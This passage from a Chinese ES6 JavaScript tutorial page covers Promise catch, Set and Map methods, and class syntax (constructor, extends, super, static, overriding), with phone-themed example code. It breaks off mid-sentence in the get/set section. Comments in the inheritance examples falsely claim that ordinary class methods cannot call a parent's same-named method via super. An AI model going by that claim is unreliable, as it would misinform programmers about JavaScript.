keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'出错了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//三抛出异常</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">reason</span><span class="token punctuation">)</span><span class="token operator">=></span> <span class="token punctuation">&#123;</span>   console<span class="token punctuation">.</span><span class="token function">warn</span><span class="token punctuation">(</span>reason<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token comment">//第一种结果</span> <span class="token comment">//返回状态为成功,因为未设置返回值,函数默认返回undefined，它为非promise类型数据</span> <span class="token comment">//所以返回值为undefined</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><h3 id="5-catch方法"><a href="#5-catch方法" class="headerlink" title="5. catch方法"></a>5. catch方法</h3><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> p <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span>reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>     <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token string">'失误拉'</span><span class="token punctuation">;</span>     <span class="token function">reject</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h2 id="十四、Set"><a href="#十四、Set" class="headerlink" title="十四、Set"></a>十四、Set</h2><h3 id="1-什么是Set"><a href="#1-什么是Set" class="headerlink" title="1. 什么是Set"></a>1. 什么是Set</h3><p>ES6提供了新的数据结构Set(集合),它类似于数组，但成员的值都是唯一的,集合实现了iterator接口,可以使用<code>扩展运算符</code>和<code>for···of</code>进行遍历</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//声明一个Set</span>   <span class="token keyword">let</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">let</span> s2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'好事儿'</span><span class="token punctuation">,</span><span class="token string">'坏事儿'</span><span class="token punctuation">,</span><span class="token string">'小事儿'</span><span class="token punctuation">,</span><span class="token string">'大事儿'</span><span class="token punctuation">,</span><span class="token string">'坏事儿'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//Set会进行自动去重</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span> <span class="token comment">//&#123;'好事儿', '坏事儿', '小事儿', '大事儿'&#125;</span></code></pre><h3 id="2-集合的属性和方法"><a href="#2-集合的属性和方法" class="headerlink" title="2. 集合的属性和方法"></a>2. 集合的属性和方法</h3><h4 id="①-size"><a href="#①-size" class="headerlink" title="① size"></a>① size</h4><p>返回集合的元素个数</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//元素的个数</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s2<span class="token punctuation">.</span>size<span class="token punctuation">)</span></code></pre><h4 id="②-add"><a href="#②-add" class="headerlink" title="② add"></a>② add</h4><p>增加一个新元素,返回当前集合</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//添加新的元素</span>   s2<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">'烦心事'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span> <span class="token comment">//&#123;'好事儿', '坏事儿', '小事儿', '大事儿', '烦心事'&#125;</span></code></pre><h4 id="③-delete"><a href="#③-delete" class="headerlink" title="③ delete"></a>③ delete</h4><p>删除元素,返回boolean值</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//删除元素</span>   s2<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token string">'坏事儿'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//&#123;'好事儿', '小事儿', '大事儿', '烦心事'&#125;</span></code></pre><h4 id="④-has"><a href="#④-has" class="headerlink" title="④ has"></a>④ has</h4><p>检测集合中是否包含某个元素,返回boolean值</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//检测集合中是否有某个元素，返回布尔值，有则返回true,没有则返回false</span>   <span class="token keyword">let</span> result <span class="token operator">=</span>s2<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string">'小事儿'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><h4 id="⑤-clear"><a href="#⑤-clear" class="headerlink" title="⑤ clear"></a>⑤ clear</h4><p>清空集合,返回undefined</p><pre class="language-js" data-language="js"><code class="language-js">result <span class="token operator">=</span> s2<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token comment">//undefined</span></code></pre><h2 id="十五、Map"><a href="#十五、Map" class="headerlink" title="十五、Map"></a>十五、Map</h2><h3 id="1-什么是Map"><a href="#1-什么是Map" class="headerlink" title="1.什么是Map"></a>1.什么是Map</h3><p>ES6提供了Map数据结构,它类似于对象,也是键值对集合.但是”键”的范围不限于字符串,各种类型的值(包括对象)都可以当作键.Map也实现了iterator接口,可以使用<code>扩展运算符</code>和<code>for···of</code>进行遍历</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//声明map</span> <span class="token keyword">let</span> m <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-Map属性和方法"><a href="#2-Map属性和方法" class="headerlink" title="2. Map属性和方法"></a>2. Map属性和方法</h3><h4 id="①-size-1"><a href="#①-size-1" class="headerlink" title="① size"></a>① size</h4><p>返回Map的元素个数</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//size</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>size<span class="token punctuation">)</span></code></pre><h4 id="②-set"><a href="#②-set" class="headerlink" title="② set"></a>② set</h4><p>增加一个新元素,返回当前Map</p><pre class="language-js" data-language="js"><code class="language-js">m<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'张小6'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//key: "name" value: "张小6"</span>   m<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'change'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'改变'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token comment">//&#123;"change" => function() &#123; console.log('改变'); &#125;&#125;</span>   <span class="token keyword">let</span> school <span class="token operator">=</span> <span class="token punctuation">&#123;</span>     name<span class="token operator">:</span> <span class="token string">'NBA'</span>   <span class="token punctuation">&#125;</span>   m<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>school<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'Kobe'</span><span class="token punctuation">,</span><span class="token string">'Jordan'</span><span class="token punctuation">,</span><span class="token string">'James'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">//key: &#123;name: 'NBA'&#125; value: (3) ['Kobe', 'Jordan', 'James']</span></code></pre><h4 id="③-get"><a href="#③-get" class="headerlink" title="③ get"></a>③ get</h4><p>返回键名对应的键值</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//获取</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>school<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//['Kobe', 'Jordan', 'James']</span></code></pre><h4 id="④-has-1"><a href="#④-has-1" class="headerlink" title="④ has"></a>④ has</h4><p>检测Map中是否包含某个元素,返回boolean值</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//检测</span>   <span class="token keyword">let</span> result <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>school<span class="token punctuation">)</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token comment">//true</span></code></pre><h4 id="⑤-clear-1"><a href="#⑤-clear-1" class="headerlink" title="⑤ clear"></a>⑤ clear</h4><p>清空集合,返回undefined</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//清空</span>   m<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="十六、class-类"><a href="#十六、class-类" class="headerlink" title="十六、class 类"></a>十六、class 类</h2><h3 id="1-什么是class"><a href="#1-什么是class" class="headerlink" title="1. 什么是class"></a>1. 什么是class</h3><p>ES6引入了Class(类)这个概念,作为对象的模板.<br>通过class关键字,可以定义类,ES6的class可以看作只是一个语法糖,它的绝大部分功能,ES5都可以做到,新的class写法让对象原型写法更加清晰。</p></li></ol><h3 id="2-constructor-定义构造函数初始化"><a href="#2-constructor-定义构造函数初始化" class="headerlink" title="2. constructor 定义构造函数初始化"></a>2. constructor 定义构造函数初始化</h3><h4 id="①-ES5实现"><a href="#①-ES5实现" class="headerlink" title="① ES5实现"></a>① ES5实现</h4> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Phone</span><span class="token punctuation">(</span><span class="token parameter">band<span class="token punctuation">,</span>price</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">this</span><span class="token punctuation">.</span>band <span class="token operator">=</span> band<span class="token punctuation">;</span>     <span class="token keyword">this</span><span class="token punctuation">.</span>price <span class="token operator">=</span> price<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">//添加方法</span>   <span class="token class-name">Phone</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">call</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我可以打电话'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">//创建实例</span>   <span class="token keyword">let</span> ip12 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phone</span><span class="token punctuation">(</span><span class="token string">'苹果12'</span><span class="token punctuation">,</span><span class="token string">'6999'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">ip12</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ip12<span class="token punctuation">)</span></code></pre><h4 id="②-ES6实现"><a href="#②-ES6实现" class="headerlink" title="② ES6实现"></a>② ES6实现</h4> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//class</span><span class="token keyword">class</span> <span class="token class-name">ChPhone</span><span class="token punctuation">&#123;</span><span class="token comment">//ChPhone 类名</span>  <span class="token comment">//构造方法 名字不能修改 (该方法自动执行的,当使用new 类名时执行)</span>  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">bind<span class="token punctuation">,</span>price</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>bind <span class="token operator">=</span> bind<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>price <span class="token operator">=</span> price<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//方法必须使用该语法,不能使用ES5的对象完整形式 call:function() &#123;&#125; </span>  <span class="token comment">//class中不支持Es5这种完整形式</span>  <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我可以打电话啊!!!'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> hw <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChPhone</span><span class="token punctuation">(</span><span class="token string">'华为5g'</span><span class="token punctuation">,</span><span class="token string">'6999'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">hw</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>hw<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="3-extends-继承父类"><a href="#3-extends-继承父类" class="headerlink" title="3. extends 继承父类"></a>3. extends 继承父类</h3><h4 id="①-ES5构造函数实现继承"><a href="#①-ES5构造函数实现继承" class="headerlink" title="① ES5构造函数实现继承"></a>① ES5构造函数实现继承</h4> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//定义父类</span>   <span class="token keyword">function</span> <span class="token function">PHone</span><span class="token punctuation">(</span><span class="token parameter">brand<span class="token punctuation">,</span>price</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">this</span><span class="token punctuation">.</span>brand <span class="token operator">=</span> brand<span class="token punctuation">;</span>     <span class="token keyword">this</span><span class="token punctuation">.</span>price <span class="token operator">=</span> price<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token class-name">PHone</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">call</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我可以打电话'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">//定义子类</span>   <span class="token keyword">function</span> <span class="token function">smallPhone</span><span class="token punctuation">(</span><span class="token parameter">brand<span class="token punctuation">,</span>price<span class="token punctuation">,</span>color<span class="token punctuation">,</span>size</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token function">PHone</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>brand<span class="token punctuation">,</span>price<span class="token punctuation">)</span> <span class="token comment">//这里的this指向smallPhone的实例对象</span>     <span class="token keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">=</span> color<span class="token punctuation">;</span>     <span class="token keyword">this</span><span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">//设置子类的原型对象为父类的实例对象</span>   smallPhone<span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PHone</span><span class="token punctuation">;</span>    smallPhone<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> smallPhone<span class="token punctuation">;</span>   smallPhone<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">photo</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我可以拍照'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">let</span> chuizi <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">smallPhone</span><span class="token punctuation">(</span><span class="token string">'锤子'</span><span class="token punctuation">,</span><span class="token number">3033</span><span class="token punctuation">,</span><span class="token string">'紫色'</span><span class="token punctuation">,</span><span class="token string">'6.6'</span><span class="token punctuation">)</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>chuizi<span class="token punctuation">)</span></code></pre><h4 id="②-ES6实现-1"><a href="#②-ES6实现-1" class="headerlink" title="② ES6实现"></a>② ES6实现</h4>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//定义父类</span>  <span class="token keyword">class</span> <span class="token class-name">Phone</span><span class="token punctuation">&#123;</span>    <span class="token comment">//构造方法</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">brind<span class="token punctuation">,</span>price</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>brind <span class="token operator">=</span> brind<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>price <span class="token operator">=</span> price<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//父类成员的属性</span>    <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我可以打电话'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//定义子类</span>  <span class="token keyword">class</span> <span class="token class-name">SmallPhone</span> <span class="token keyword">extends</span> <span class="token class-name">Phone</span><span class="token punctuation">&#123;</span> <span class="token comment">//extends继承</span>    <span class="token comment">//构造方法</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">brand<span class="token punctuation">,</span>price<span class="token punctuation">,</span>color<span class="token punctuation">,</span>size</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">//super就是父类的constructor方法(构造方法)</span>      <span class="token keyword">super</span><span class="token punctuation">(</span>brand<span class="token punctuation">,</span>price<span class="token punctuation">)</span> <span class="token comment">//相当于Phone.call(this,brand,price)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">=</span> color<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">photo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我可以拍照'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token function">playG</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我可以玩游戏'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//对父的同名方法进行重写</span>    <span class="token comment">//在js的class语法中,子类不可以调用父类的同名方法 </span>    <span class="token comment">//在普通的成员方法中不允许出现super去调用父类的同名方法</span>    <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我可以视频'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span></code></pre><h3 id="4-super-调用父级构造方法"><a href="#4-super-调用父级构造方法" class="headerlink" title="4. super 调用父级构造方法"></a>4. super 调用父级构造方法</h3> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//定义父类</span>  <span class="token keyword">class</span> <span class="token class-name">Phone</span><span class="token punctuation">&#123;</span>    <span class="token comment">//构造方法</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">brind<span class="token punctuation">,</span>price</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>brind <span class="token operator">=</span> brind<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>price <span class="token operator">=</span> price<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//父类成员的属性</span>    <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我可以打电话'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//定义子类</span>  <span class="token keyword">class</span> <span class="token class-name">SmallPhone</span> <span class="token keyword">extends</span> <span class="token class-name">Phone</span><span class="token punctuation">&#123;</span> <span class="token comment">//extends继承</span>    <span class="token comment">//构造方法</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">brand<span class="token punctuation">,</span>price<span class="token punctuation">,</span>color<span class="token punctuation">,</span>size</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">//super就是父类的constructor方法(构造方法)</span>      <span class="token keyword">super</span><span class="token punctuation">(</span>brand<span class="token punctuation">,</span>price<span class="token punctuation">)</span> <span class="token comment">//相当于Phone.call(this,brand,price)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">=</span> color<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span></code></pre><h3 id="5-static-定义静态方法和属性"><a href="#5-static-定义静态方法和属性" class="headerlink" title="5. static 定义静态方法和属性"></a>5. static 定义静态方法和属性</h3><h4 id="①-ES5实现-1"><a href="#①-ES5实现-1" class="headerlink" title="① ES5实现"></a>① ES5实现</h4> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Phone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span> Phone<span class="token punctuation">.</span>names <span class="token operator">=</span> <span class="token string">'手机'</span><span class="token punctuation">;</span> Phone<span class="token punctuation">.</span><span class="token function-variable function">change</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我可以改变世界'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Phone<span class="token punctuation">.</span>names<span class="token punctuation">)</span> <span class="token comment">//手机</span> Phone<span class="token punctuation">.</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//我可以改变世界</span> <span class="token keyword">let</span> ip <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//实例对象身上是没有构造函数(构造函数本身)身上的属性和方法</span> <span class="token comment">//实例对象(ip)和函数对象(Phone)的属性是不相通的,</span> <span class="token comment">//函数对象添加的(names和change)属性是属于函数对象（Phone）的,它并不属于实例对象(ip)</span> <span class="token comment">//对于上面说的这样的属性,我们把它称为静态成员</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ip<span class="token punctuation">.</span>names<span class="token punctuation">)</span> <span class="token comment">//undefined</span></code></pre><h4 id="②-ES6实现-2"><a href="#②-ES6实现-2" class="headerlink" title="② ES6实现"></a>② ES6实现</h4> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//静态成员,在面向对象中,这样的属性是属于类的,并不属于实例对象</span> <span class="token keyword">class</span> <span class="token class-name">PHONE</span> <span class="token punctuation">&#123;</span>   <span class="token comment">//静态属性 </span>   <span class="token comment">//对于static标注的属性和方法,它属于类而不属于实例对象</span>   <span class="token keyword">static</span> names <span class="token operator">=</span> <span class="token string">'华为手机'</span>   <span class="token keyword">static</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'中国制造'</span><span class="token punctuation">)</span>   <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">let</span> pg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PHONE</span><span class="token punctuation">(</span><span class="token punctuation">)</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>pg<span class="token punctuation">.</span>names<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//undefined</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">PHONE</span><span class="token punctuation">.</span>names<span class="token punctuation">)</span> <span class="token comment">//华为手机</span></code></pre><h3 id="6-父类方法可以重写"><a href="#6-父类方法可以重写" class="headerlink" title="6. 父类方法可以重写"></a>6. 父类方法可以重写</h3> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//定义父类</span>  <span class="token keyword">class</span> <span class="token class-name">Phone</span><span class="token punctuation">&#123;</span>    <span class="token comment">//构造方法</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">brind<span class="token punctuation">,</span>price</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>brind <span class="token operator">=</span> brind<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>price <span class="token operator">=</span> price<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//父类成员的属性</span>    <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我可以打电话'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//定义子类</span>  <span class="token keyword">class</span> <span class="token class-name">SmallPhone</span> <span class="token keyword">extends</span> <span class="token class-name">Phone</span><span class="token punctuation">&#123;</span> <span class="token comment">//extends继承</span>    <span class="token comment">//构造方法</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">brand<span class="token punctuation">,</span>price<span class="token punctuation">,</span>color<span class="token punctuation">,</span>size</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">//super就是父类的constructor方法(构造方法)</span>      <span class="token keyword">super</span><span class="token punctuation">(</span>brand<span class="token punctuation">,</span>price<span class="token punctuation">)</span> <span class="token comment">//相当于Phone.call(this,brand,price)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">=</span> color<span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//对父的同名方法进行重写</span>    <span class="token comment">//在js的class语法中,子类不可以调用父类的同名方法 </span>    <span class="token comment">//在普通的成员方法中不允许出现super去调用父类的同名方法</span>    <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我可以视频'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">let</span> xiaomi <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SmallPhone</span><span class="token punctuation">(</span><span class="token string">'小米'</span><span class="token punctuation">,</span><span class="token number">4567</span><span class="token punctuation">,</span><span class="token string">'天蓝'</span><span class="token punctuation">,</span><span class="token string">'6.6'</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xiaomi<span class="token punctuation">)</span>  <span class="token function">xiaomi</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//我可以视频  这里是调用了子类的call方法</span></code></pre><h3 id="7-get和set"><a href="#7-get和set" class="headerlink" title="7. get和set"></a>7. get和set</h3><p> ES5中的get、set,可以对一个对象的属性进行方法的绑定<br> ① get 添加一个get方法,当对某一个属性进行获取时,执行get对应的函数</p><p> ② set 